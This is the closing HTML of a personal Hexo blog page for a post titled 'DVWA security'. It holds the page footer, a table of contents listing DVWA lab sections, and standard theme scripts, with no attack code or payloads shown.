+      <a href="/2026/07/27/ctfshow-crypto-wp/" aria-label="Next: ctfshow-crypto-wp"  title="Next: ctfshow-crypto-wp"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          ctfshow-crypto-wp
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dvwa-security"><span class="toc-number">1.</span> <span class="toc-text"> DVWA security</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、靶机的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、靶机实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1low"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2meduim"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.Meduim</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1brute-force"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 1）Brute Force</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2command-injection"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 2）Command Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3csrf"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> 3）CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.2.4.</span> <span class="toc-text"> 4）文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5weak-session-ids"><span class="toc-number">1.2.2.5.</span> <span class="toc-text"> 5）Weak Session IDs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6xss_drs"><span class="toc-number">1.2.2.6.</span> <span class="toc-text"> 6）xss_d&amp;r&amp;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7content-security-policy-csp-bypass"><span class="toc-number">1.2.2.7.</span> <span class="toc-text"> 7）Content Security Policy (CSP) Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8javascript-attacks"><span class="toc-number">1.2.2.8.</span> <span class="toc-text"> 8）JavaScript Attacks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9authorisation-bypass"><span class="toc-number">1.2.2.9.</span> <span class="toc-text"> 9）Authorisation Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10open-http-redirect"><span class="toc-number">1.2.2.10.</span> <span class="toc-text"> 10）Open HTTP Redirect</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3high"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 3.high</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1brute-force-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> 1）Brute Force</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2command-injection-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> 2）Command Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3csrf-2"><span class="toc-number">1.2.3.3.</span> <span class="toc-text"> 3）CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4xss_drs"><span class="toc-number">1.2.3.4.</span> <span class="toc-text"> 4）xss_d&amp;r&amp;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5sql"><span class="toc-number">1.2.3.5.</span> <span class="toc-text"> 5）SQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6content-security-policy-csp-bypass"><span class="toc-number">1.2.3.6.</span> <span class="toc-text"> 6）Content Security Policy (CSP) Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7authorisation-bypass"><span class="toc-number">1.2.3.7.</span> <span class="toc-text"> 7）Authorisation Bypass</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "DVWA security",
+          url: "https://cl1ck-t0.github.io/2026/07/31/DVWA-security/",
+          excerpt: "",
+          description: "",
+          stripContent: " DVWA security  一、靶机的搭建 窝本来是想和往常一样用phpstudy启动靶场服务的，突然不想这么干，于是窝再建立了一个虚拟机，在网上找了一个服务器安装镜像 Ubuntu 22.04.5 LTS（Jammy Jellyfish） 准备搞一个无图形用户界面纯命令行的靶机（毕竟只是一个靶机不需要其他功能，至于为什么不用kali作为靶机，是因为ubuntu比较小emmmmmm，随便给点配置就够用了） 虚拟机的配置和以往差不多，可以先选择NET连接便于后续相关源码和工具的下载，运存2G完",
+          date: "Fri Jul 31 2026 12:41:35 GMT+0800",
+          updated: "Fri Aug 07 2026 12:07:28 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
